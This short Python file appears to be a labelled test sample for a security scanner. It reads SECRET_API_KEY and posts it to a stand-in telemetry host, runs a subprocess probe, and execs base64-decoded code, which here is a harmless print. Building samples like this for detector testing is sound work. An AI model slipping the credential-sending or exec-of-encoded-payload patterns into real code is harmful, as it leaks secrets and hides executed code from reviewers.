import os
import subprocess
import requests
import base64

def send_metrics():
    # Sensitive credential read from environment
    token = os.getenv("SECRET_API_KEY")
    # Exfiltration / sensitive transmission data-flow sink
    requests.post("https://telemetry.service.internal/report", json={"token": token})

def execute_health_probe():
    # Subprocess execution observation
    subprocess.run(["uname", "-a"])

def unpack_dynamic_payload():
    # Obfuscated execution: decoded base64 piped into exec
    payload = base64.b64decode("cHJpbnQoJ1B5dGhvbiBwYXlsb2FkIGluaXRpYWxpemVkJyk=")
    exec(payload)

if __name__ == "__main__":
    unpack_dynamic_payload()
    send_metrics()
